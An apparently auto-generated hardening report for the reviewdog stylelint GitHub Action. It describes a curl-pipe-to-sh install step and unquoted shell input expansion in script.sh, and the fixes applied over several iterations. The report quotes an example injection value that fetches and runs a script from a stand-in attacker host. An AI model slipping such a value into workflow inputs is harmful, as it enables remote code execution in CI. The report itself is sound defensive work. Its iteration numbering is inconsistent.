<!-- markdownlint-disable -->

# Hardening Report: reviewdog--action-stylelint/v1.30.2

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `1`

Action **reviewdog--action-stylelint/v1.30.2** was hardened automatically. 2 finding(s) were identified and resolved across 3 iteration(s).

## Findings Fixed

### unsafe-shell (severity: high)

script.sh pipes a remotely fetched install script directly to `sh` without first saving it to disk for inspection. The pattern `curl -sfL https://raw.githubusercontent.com/.../install.sh | sh -s -- ...` executes whatever the remote URL serves, making the workflow vulnerable to supply-chain attacks if the URL or its content is ever compromised.

Locations:

- `script.sh:33`

### script-injection (severity: high)

Sub-rule (b): Unquoted shell variable expansion of workflow-controlled env vars.

1. Line 9: `cmd="stylelint ${INPUT_STYLELINT_INPUT} --custom-formatter ${STYLELINT_FORMATTER}"` — `INPUT_STYLELINT_INPUT` is set from `inputs.stylelint_input` and is expanded unquoted inside a double-quoted string that is later passed to `npx --no-install -c "${cmd}"`. An attacker-controlled value containing shell metacharacters (`;`, `|`, `$(...)`, etc.) can break out of the intended command.

2. Line 44: `npm install ${INPUT_PACKAGES}` — `INPUT_PACKAGES` is set from `inputs.packages` and is expanded completely unquoted. An attacker can inject arbitrary shell commands via this input (e.g., `; curl attacker.com | sh`).

Locations:

- `script.sh:9`
- `script.sh:44`

## Iteration Notes

### Iteration 1

**Fixes applied:** unsafe-shell, script-injection

**Notes:**

Fixed three issues in script.sh:

1. unsafe-shell (line 33): Replaced `curl -sfL ... | sh -s -- ...` with a two-step approach: download the install script to a temp file using `curl -sfL -o "${INSTALL_SCRIPT}"`, execute it separately with `sh "${INSTALL_SCRIPT}"`, then clean up with `rm -f`. This allows the script to be inspected before execution.

2. script-injection (line 9): Replaced the string-building pattern (`cmd="stylelint ${INPUT_STYLELINT_INPUT} ..."` passed to `npx --no-install -c "${cmd}"`) with positional parameters (`set -- stylelint "${INPUT_STYLELINT_INPUT}" ...`) passed directly to `npx --no-install "$@"`. This eliminates the shell `-c` interpretation vector that allowed metacharacter injection.

3. script-injection (line 44): Replaced `npm install ${INPUT_PACKAGES}` (completely unquoted, allowing glob expansion) with `set -- ${INPUT_PACKAGES}` followed by `npm install "$@"`, which splits on IFS whitespace in a controlled manner and passes each package as a properly quoted individual argument to npm.

### Iteration 2

**Fixes applied:** script-injection

**Notes:**

Fixed script-injection vulnerability in script.sh line 53. The unquoted `set -- ${INPUT_PACKAGES}` expansion was wrapped with `set -f` (disable glob expansion) before and `set +f` (re-enable) after. This prevents glob/metacharacter injection (e.g., `;`, `|`, `&`, `$(...)`, glob patterns) from the user-controlled `packages` input while preserving the intended word-splitting behavior needed to pass individual package names as separate arguments to `npm install`.

### Iteration 1

**Fixes applied:** script-injection

**Notes:**

Fixed script-injection in script.sh line 49: Added a validation loop after the `set -- ${INPUT_PACKAGES}` word-splitting to reject any token starting with '-' (which would be an injected flag like --ignore-scripts=false). The loop iterates over each split package name using `for _pkg in "$@"` and uses a `case` statement to detect and reject flag-like arguments, exiting with an error. This prevents attackers from injecting arbitrary npm flags through the `packages` input while still allowing legitimate package names to be installed.

